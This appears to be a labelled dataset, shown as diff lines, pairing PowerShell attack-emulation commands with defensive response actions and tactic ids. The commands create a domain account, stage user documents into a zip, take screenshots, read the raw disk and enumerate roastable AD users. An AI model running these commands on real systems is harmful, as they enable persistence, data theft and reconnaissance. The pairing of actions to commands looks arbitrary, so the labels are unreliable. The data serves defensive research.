+action:{ if response is upload or download, Block this command by the network traffic }
+command:"c:\Program Files\Wireshark\tshark.exe" -i Ethernet -c 5
+response:PS C:\Users\chris> "c:\Program Files\Wireshark\tshark.exe" -i Ethernet -c 5
+PS C:\Users\chris>
+tactic:7
+technique:37
+
+
+action:
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The user name specified is not valid because it contains invalid characters. 
+PS C:\Users\chris>
+tactic:1
+technique:37
+
+
+action:{ modify powershell response }
+command:$startingDirectory = "C:\Users"
+response:PS C:\Users\chris> $startingDirectory = "C:\Users"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:PS C:\Users\chris> $outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Block this command this time }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:PS C:\Users\chris> $fileExtensionsString = ".doc, .docx, .txt"
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:PS C:\Users\chris> $fileExtensions = $fileExtensionsString -split ", "
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ modify powershell response }
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:PS C:\Users\chris> New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Function Search-Files {
+response:PS C:\Users\chris> Function Search-Files {
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  param (
+response:PS C:\Users\chris> param (
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:    [string]$directory
+response:PS C:\Users\chris> [string]$directory
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:  )
+response:PS C:\Users\chris> )
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ Restore to original state }
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:PS C:\Users\chris> $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ modify powershell response }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:PS C:\Users\chris>     $fileExtensions -contains $_.Extension.ToLower()
+PS C:\Users\chris>
+tactic:11
+technique:46
+
+
+action:
+command:  }
+response:PS C:\Users\chris> }
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  return $files
+response:PS C:\Users\chris> return $files
+PS C:\Users\chris>
+tactic:7
+technique:46
+
+
+action:{ Restore to original state }
+command:}
+response:PS C:\Users\chris> }
+PS C:\Users\chris>
+tactic:6
+technique:46
+
+
+action:{ if response is file content, modify the file content }
+command:$foundFiles = Search-Files -directory $startingDirectory
+response:PS C:\Users\chris> $foundFiles = Search-Files -directory $startingDirectory
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ if response is file content, modify the file content }
+command:if ($foundFiles.Count -gt 0) {
+response:PS C:\Users\chris> if ($foundFiles.Count -gt 0) {
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:  $foundFilePaths = $foundFiles.FullName
+response:PS C:\Users\chris> $foundFilePaths = $foundFiles.FullName
+PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ Restore to original state }
+command:  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+response:PS C:\Users\chris> Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:  Write-Host "Zip file created: $outputZip\data.zip"
+response:PS C:\Users\chris> Write-Host "Zip file created: $outputZip\data.zip"
+PS C:\Users\chris>
+tactic:1
+technique:37
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:  } else {
+response:PS C:\Users\chris> } else {
+PS C:\Users\chris>
+tactic:10
+technique:46
+
+
+action:{ Block this command this time }
+command:      Write-Host "No files found with the specified extensions."
+response:PS C:\Users\chris>      Write-Host "No files found with the specified extensions."
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ modify the response by change the access right }
+command:  }
+response:PS C:\Users\chris> }
+PS C:\Users\chris>
+tactic:4
+technique:174
+
+
+action:{ Restore to original state }
+command:Add-Type -AssemblyName System.Windows.Forms
+response:PS C:\Users\chris> Add-Type -AssemblyName System.Windows.Forms
+PS C:\Users\chris>
+tactic:5
+technique:124
+
+
+action:{ allow command execute this time }
+command:$screen = [Windows.Forms.SystemInformation]::VirtualScreen
+response:PS C:\Users\chris> $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+PS C:\Users\chris>
+tactic:5
+technique:131
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+response:PS C:\Users\chris> $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+PS C:\Users\chris>
+tactic:2
+technique:46
+
+
+action:{ modify powershell response }
+command:$graphic = [Drawing.Graphics]::FromImage($bitmap)
+response:PS C:\Users\chris> $graphic = [Drawing.Graphics]::FromImage($bitmap)
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:
+command:$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+response:PS C:\Users\chris> $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+PS C:\Users\chris>
+tactic:1
+technique:156
+
+
+action:
+command:$bitmap.Save("$env:TEMP\T1113.png")
+response:PS C:\Users\chris> $bitmap.Save("$env:TEMP\T1113.png")
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ allow command execute this time }
+command:$buffer = New-Object byte[] 11
+response:PS C:\Users\chris> $buffer = New-Object byte[] 11
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ Restore to original state }
+command:$handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
+response:PS C:\Users\chris> $handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
+PS C:\Users\chris>
+tactic:11
+technique:46
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$handle.Read($buffer, 0, $buffer.Length)
+response:PS C:\Users\chris> $handle.Read($buffer, 0, $buffer.Length)
+PS C:\Users\chris>
+tactic:1
+technique:37
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:$handle.Close()
+response:PS C:\Users\chris> $handle.Close()
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Format-Hex -InputObject $buffer
+response:PS C:\Users\chris> Format-Hex -InputObject $buffer
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ Block this command this time }
+command:Write-Host Joining this computer to a domain must be done manually.
+response:PS C:\Users\chris> Write-Host Joining this computer to a domain must be done manually.
+PS C:\Users\chris>
+tactic:6
+technique:62
+
+
+action:{ allow command execute this time }
+command:Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+response:PS C:\Users\chris> Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+PS C:\Users\chris>
+tactic:5
+technique:3
+
+
+action:{ modify the response by change the access right }
+command:Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+response:PS C:\Users\chris> Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ modify powershell response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:PS C:\Users\chris> Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+PS C:\Users\chris>
+tactic:0
+technique:37
+
+
+action:{ modify the response by change the access right }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+PS C:\Users\chris>
